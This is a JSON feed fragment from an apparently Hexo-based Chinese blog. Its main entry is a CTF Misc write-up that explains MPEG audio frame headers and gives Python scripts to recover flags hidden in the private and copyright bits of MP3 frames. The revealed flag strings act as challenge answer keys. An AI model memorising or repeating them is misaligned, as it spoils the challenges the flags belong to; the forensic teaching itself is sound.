            "title": "Misc——私有bit隐写",
            "date_published": "2022-09-17T06:02:32.000Z",
            "content_html": "<h2 id=\"0x01-知识点\"><a class=\"markdownIt-Anchor\" href=\"#0x01-知识点\">#</a> <strong>0x01 知识点</strong></h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">typedef FrameHeader</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;// 类型     字段名:bit数</span><br><span class=\"line\">unsigned int sync:12;                        //同步信息</span><br><span class=\"line\">unsigned int version:2;                      //版本</span><br><span class=\"line\">unsigned int layer: 2;                       //层</span><br><span class=\"line\">unsigned int error protection:1;             //CRC校验</span><br><span class=\"line\">unsigned int bitrate_index:4;                //位率</span><br><span class=\"line\">unsigned int sampling_frequency:2;           //采样频率</span><br><span class=\"line\">unsigned int padding:1;                      //帧长调节</span><br><span class=\"line\">unsigned int private:1;                      //保留字 【通常藏有flag】</span><br><span class=\"line\">unsigned int mode:2;                         //声道模式</span><br><span class=\"line\">unsigned int mode extension:2;        \t\t //扩充模式</span><br><span class=\"line\">unsigned int copyright:1;                    //版权   【通常藏有flag】</span><br><span class=\"line\">unsigned int original:1;                     //原版标志</span><br><span class=\"line\">unsigned int emphasis:2;                     //强调模式</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>帧长度是压缩时每一帧的长度， <code>包括帧头</code> 的 4 个字节（32bit）。它将填充的空位也计算在内。</li>\n<li>padding 的值会影响每一帧的长度（具体分析见下面的题目），因为只有 1 位，因此长度也只限于在 0 和 1 之间变化</li>\n</ul>\n<h2 id=\"0x02-题目分析\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目分析\">#</a> 0x02 题目分析</h2>\n<p>将解压后的 <code>1.mp3</code>  文件用 010Editor 打开</p>\n<p>可以看到一个 mp3 文件，里面基本上由 mf 数组构成。</p>\n<p><img src=\"image-20220917115510767.png\" alt=\"image-20220917115510767\"></p>\n<p>分析详见图片</p>\n<p><img src=\"image-20220917120013835.png\" alt=\"image-20220917120013835\"></p>\n<p>接着，可以发现，每个 mf 数组大小不一，有的是 0x1A1，有的 0x1A2</p>\n<p><img src=\"image-20220917120301874.png\" alt=\"image-20220917120301874\"></p>\n<blockquote>\n<p>图中可知，private_bit 的数值的在 0 和 1 中变化，可以让 <code>copyright</code>  、 <code>private_bit</code>  这样的单 bit 位在 0 和 1 之间发生改变，进而影响了单独 mf 数组的大小。因此，这两位在整个 mf 数组中连续拼接可能藏有 flag 或者重要的信息，优先提取。</p>\n</blockquote>\n<h2 id=\"0x03-解析脚本\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解析脚本\">#</a> 0x03 解析脚本</h2>\n<p>脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">   <span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\">   <span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">   n = <span class=\"number\">0x399D0</span> + <span class=\"number\">2</span>  <span class=\"comment\"># 起始位置，为什么+2 下面有解释</span></span><br><span class=\"line\">   target_bit = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">   flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">   file = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;1.mp3&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"comment\"># 以二进制打开文件</span></span><br><span class=\"line\">   <span class=\"comment\"># 提取</span></span><br><span class=\"line\">   <span class=\"keyword\">while</span> n &lt; <span class=\"number\">0x294C6A</span>:  <span class=\"comment\"># 结束位置</span></span><br><span class=\"line\">       file.seek(n, <span class=\"number\">0</span>) <span class=\"comment\"># 从头吃掉第一帧前面的字节(0x399D0) + frame_sync、 mpeg_id、layer_id、protection_bit这四个字段(16bit，即2字节)</span></span><br><span class=\"line\">       byte = file.read(<span class=\"number\">1</span>)  <span class=\"comment\">#往后读取一个字节（8位）</span></span><br><span class=\"line\">       padding = <span class=\"string\">&#x27;&#123;:08b&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">ord</span>(byte))[-<span class=\"number\">2</span>] <span class=\"comment\">#从中提取倒数第2个bit 也就是padding的值 ord函数，是chr函数的对应，将字符变成10进制数字</span></span><br><span class=\"line\">       target_bit += <span class=\"string\">&#x27;&#123;:08b&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">ord</span>(byte))[-<span class=\"number\">1</span>] <span class=\"comment\">#从中提取倒数第1个bit 也就是private_bit的值，需要累加拼接</span></span><br><span class=\"line\">       <span class=\"keyword\">if</span> padding == <span class=\"string\">&quot;1&quot;</span>:</span><br><span class=\"line\">           n += <span class=\"number\">0x1A2</span></span><br><span class=\"line\">       <span class=\"keyword\">else</span>:</span><br><span class=\"line\">           n += <span class=\"number\">0x1A1</span></span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"built_in\">print</span>(target_bit)</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"comment\">#textArr = re.findall(&#x27;.&#123;&#x27;+str(8)+&#x27;&#125;&#x27;, result)</span></span><br><span class=\"line\">   textArr = re.findall(<span class=\"string\">r&#x27;\\d&#123;8&#125;&#x27;</span>, target_bit) <span class=\"comment\">#利用正则匹配每8个数字为一组，将其变为字符串数组方便处理</span></span><br><span class=\"line\">   <span class=\"built_in\">print</span>(textArr)</span><br><span class=\"line\">   <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> textArr:</span><br><span class=\"line\">       flag += <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(i, <span class=\"number\">2</span>)).strip(<span class=\"string\">&#x27;\\n&#x27;</span>)     <span class=\"comment\">#int(&#x27;二进制数&#x27;, 2) 就转成了10进制   chr(&#x27;10进制数&#x27;) 就转成字符</span></span><br><span class=\"line\">   </span><br><span class=\"line\">   </span><br><span class=\"line\">   <span class=\"comment\">#print(flag) #发现后面有很多未知空字符，删也删不掉</span></span><br><span class=\"line\">   flag = re.findall(<span class=\"string\">r&#x27;\\w+\\&#123;.+\\&#125;&#x27;</span>,flag) <span class=\"comment\">#用正则匹配标准flag</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag[<span class=\"number\">0</span>])</span><br></pre></td></tr></table></figure>\n<p 0k4_YOu_Seem_s0_cl3ver_t0_find_f1ag!=\"\">flag</p>\n<p><img src=\"image-20220917134916608.png\" alt=\"image-20220917134916608\"></p>\n<h2 id=\"0x04-常用正则补充\"><a class=\"markdownIt-Anchor\" href=\"#0x04-常用正则补充\">#</a> 0x04 常用正则 (补充)</h2>\n<p>①<strong>显示不可打印的字符</strong></p>\n<table>\n<thead>\n<tr>\n<th>字符</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>\\a</td>\n<td>报警</td>\n</tr>\n<tr>\n<td>\\b</td>\n<td>退格</td>\n</tr>\n<tr>\n<td>\\f</td>\n<td>换页</td>\n</tr>\n<tr>\n<td>\\n</td>\n<td>换行</td>\n</tr>\n<tr>\n<td>\\r</td>\n<td>回车</td>\n</tr>\n<tr>\n<td>\\t</td>\n<td>字表符</td>\n</tr>\n</tbody>\n</table>\n<p>②<strong>指定预定义的字符集</strong></p>\n<table>\n<thead>\n<tr>\n<th>字符</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>\\d</td>\n<td>任意一个十进制数字 [0-9]</td>\n</tr>\n<tr>\n<td>\\D</td>\n<td>任意一个非十进制数字</td>\n</tr>\n<tr>\n<td>\\s</td>\n<td>任意一个空白字符 (空格、换行符、换页符、回车符、字表符)</td>\n</tr>\n<tr>\n<td>\\S</td>\n<td>任意一个非空白字符</td>\n</tr>\n<tr>\n<td>\\w</td>\n<td>任意一个单词字符</td>\n</tr>\n<tr>\n<td>\\W</td>\n<td>任意个非单词字符</td>\n</tr>\n</tbody>\n</table>\n<p>③<strong>限定符 (？*+{n，m}.)</strong><br>\n 限定符主要是用来限定每个字符串出现的次数。</p>\n<table>\n<thead>\n<tr>\n<th>限定字符</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>？</td>\n<td>零次或一次</td>\n</tr>\n<tr>\n<td>*</td>\n<td>零次或多次</td>\n</tr>\n<tr>\n<td>+</td>\n<td>一次或多次</td>\n</tr>\n<tr>\n<td n=\"\"></td>\n<td>n 次</td>\n</tr>\n<tr>\n<td n,=\"\"></td>\n<td>至少 n 次</td>\n</tr>\n<tr>\n<td n,m=\"\"></td>\n<td>n 到 m 次</td>\n</tr>\n<tr>\n<td>.</td>\n<td>匹配任意一个字符（不包含换行符）</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"0x05-再来一道\"><a class=\"markdownIt-Anchor\" href=\"#0x05-再来一道\">#</a> 0x05 再来一道</h2>\n<p>翻看了几帧发现 <code>private_bit</code>  位都是 0，似乎并没有存储数据。但是在翻看的时候发现，<ins> <code>uint32 copyright</code>  这一位似乎内藏玄机</ins>，这一位在相邻几帧的数据有 0 有 1，查询得知这是版权位，通常不会出现不同帧有 0 有 1 的情况。</p>\n<p>于是决定将 <code>copyright</code>  位的数据提取出来看看。</p>\n<p><img src=\"image-20220917134512128.png\" alt=\"image-20220917134512128\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">0xF05A4</span> + <span class=\"number\">2</span>  <span class=\"comment\"># 起始位置，为什么+2 下面有解释</span></span><br><span class=\"line\">target_bit = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">file = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;2.mp3&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>)  <span class=\"comment\"># 以二进制打开文件</span></span><br><span class=\"line\"><span class=\"comment\"># 提取</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> n &lt; <span class=\"number\">0xC12623</span>:  <span class=\"comment\"># 结束位置</span></span><br><span class=\"line\">    file.seek(n, <span class=\"number\">0</span>)  <span class=\"comment\"># 从头吃掉第一帧前面的字节(0x399D0) + frame_sync、 mpeg_id、layer_id、protection_bit这四个字段(16bit，即2字节)</span></span><br><span class=\"line\">    byte = file.read(<span class=\"number\">1</span>)  <span class=\"comment\"># 往后读取一个字节（8位）</span></span><br><span class=\"line\">    padding = <span class=\"string\">&#x27;&#123;:08b&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">ord</span>(byte))[-<span class=\"number\">2</span>]  <span class=\"comment\"># 从中提取倒数第2个bit 也就是padding的值</span></span><br><span class=\"line\">    file.seek(n + <span class=\"number\">1</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    byte = file.read(<span class=\"number\">1</span>)</span><br><span class=\"line\">    target_bit += <span class=\"string\">&#x27;&#123;:08b&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">ord</span>(byte))[-<span class=\"number\">4</span>]  <span class=\"comment\"># 从中提取倒数第1个bit 也就是copyright的值，需要累加拼接</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> padding == <span class=\"string\">&quot;1&quot;</span>:</span><br><span class=\"line\">        n += <span class=\"number\">0x415</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        n += <span class=\"number\">0x414</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(target_bit)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># textArr = re.findall(&#x27;.&#123;&#x27;+str(8)+&#x27;&#125;&#x27;, result)</span></span><br><span class=\"line\">textArr = re.findall(<span class=\"string\">r&#x27;\\d&#123;8&#125;&#x27;</span>, target_bit)  <span class=\"comment\"># 利用正则匹配每8个数字为一组，将其变为字符串数组方便处理</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(textArr)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> textArr:</span><br><span class=\"line\">    flag += <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(i, <span class=\"number\">2</span>)).strip(<span class=\"string\">&#x27;\\n&#x27;</span>)  <span class=\"comment\"># int(&#x27;二进制数&#x27;, 2) 就转成了10进制   chr(&#x27;10进制数&#x27;) 就转成字符</span></span><br><span class=\"line\"></span><br><span class=\"line\">flag = re.findall(<span class=\"string\">r&#x27;\\w+\\&#123;.+\\&#125;&#x27;</span>,flag)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag[<span class=\"number\">0</span>])</span><br></pre></td></tr></table></figure>\n<p b3d7bed5-e8da-4d9c-848c-e5d332d63bcd=\"\">flag</p>\n<p><img src=\"image-20220917134626086.png\" alt=\"image-20220917134626086\"></p>\n",
            "tags": [
                "CTF小训",
                "Misc"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/",
            "url": "https://kiyomijin.github.io/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/",
            "title": "测试文章",
            "date_published": "2022-07-13T19:13:28.000Z",
            "content_html": "<p>这是一篇测试文章</p>\n<img src=\"/2022/07/14/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/test.png\" class=\"\" title=\"图片引用方法一\">\n<p><img src=\"test.png\" alt=\"图片引用方法二\"></p>\n",
            "tags": [
                "原创"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/07/13/hello-world/",
            "url": "https://kiyomijin.github.io/2022/07/13/hello-world/",
            "title": "Hello World",
            "date_published": "2022-07-13T15:20:21.111Z",
            "content_html": "<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n",
            "tags": []
        }
    ]
}